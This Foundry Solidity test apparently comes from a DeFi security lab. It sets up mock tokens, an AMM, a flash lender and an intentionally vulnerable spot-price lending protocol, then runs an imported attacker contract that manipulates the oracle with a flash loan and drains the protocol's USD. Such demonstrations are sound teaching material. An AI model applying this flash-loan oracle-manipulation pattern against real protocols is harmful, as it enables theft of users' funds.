// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "../../src/vulns/D23_MockERC20.sol";
import "../../src/vulns/FlashLenderMock.sol";

import "../../src/vulns/SimpleAMM.sol";
import "../../src/vulns/SpotOracleLending.sol";
import "../../src/vulns/AttackSpotOracle.sol";

/// @title D23 FlashLoan impact - spot price oracle manipulation demo (Route B)
/// 如果你想立刻跑通路 B：按第 3 点改 ltvBps=9000 + borrowUsd=520_000 ether，基本就过了
contract D23_FlashLoanSpotOracle_Test is Test {
    MockERC20 usd;
    MockERC20 eth;

    FlashLenderMock lender;
    SimpleAMM amm;
    SpotOracleLending lending;
    AttackSpotOracle attacker;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        usd = new MockERC20("Mock USD", "mUSD", 18);
        eth = new MockERC20("Mock ETH", "mETH", 18);

        // AMM pool (USD/ETH)
        amm = new SimpleAMM(usd, eth);

        // Seed AMM liquidity: 1,000,000 USD and 1,000 ETH => spot ~ 1000 USD/ETH
        usd.mint(alice, 1_000_000 ether);
        eth.mint(alice, 1_000 ether);
        vm.startPrank(alice);
        usd.approve(address(amm), type(uint256).max);
        eth.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1_000_000 ether, 1_000 ether);
        vm.stopPrank();

        // Vulnerable lending protocol uses AMM spot price
        lending = new SpotOracleLending(usd, eth, amm, 5000); // 50% LTV

        // Fund lending protocol with USD liquidity to lend out
        usd.mint(address(lending), 600_000 ether);

        // Flash lender lends USD
        lender = new FlashLenderMock(usd, 5); // 0.05%
        usd.mint(address(lender), 1_000_000 ether);

        // Deploy attacker
        vm.prank(bob);
        attacker = new AttackSpotOracle(usd, eth, lender, amm, lending);
    }

    function test_flashloan_spotOracleManipulation_drainsProtocol() public {
        uint256 priceBefore = lending.priceUsdPerEth();
        uint256 protocolUsdBefore = usd.balanceOf(address(lending));

        // Attack parameters 闪电贷借500_000
        uint256 flashUsd = 500_000 ether;

        // After swapping 500k USD into ETH, spot price increases; attacker then borrows near limit.
        // Choose a borrow amount that fits the manipulated limit but extracts meaningful value.
        uint256 borrowUsd = 400_000 ether;

        vm.prank(bob);
        attacker.run(flashUsd, borrowUsd);

        uint256 priceAfter = lending.priceUsdPerEth();
        uint256 protocolUsdAfter = usd.balanceOf(address(lending));
        uint256 attackerProfit = usd.balanceOf(address(attacker));

        // ---- Assertions ("操纵前后资产变化") ----
        assertGt(
            priceAfter,
            priceBefore,
            "spot price should be manipulated up"
        );
        assertGt(attackerProfit, 0, "attacker should profit");
        assertLt(
            protocolUsdAfter,
            protocolUsdBefore,
            "protocol should lose USD liquidity"
        );

        emit log_named_uint("priceBefore(USD/ETH,1e18)", priceBefore);
        emit log_named_uint("priceAfter(USD/ETH,1e18)", priceAfter);
        emit log_named_uint("protocolUsdBefore", protocolUsdBefore);
        emit log_named_uint("protocolUsdAfter", protocolUsdAfter);
        emit log_named_uint("attackerProfit(USD)", attackerProfit);
    }
}
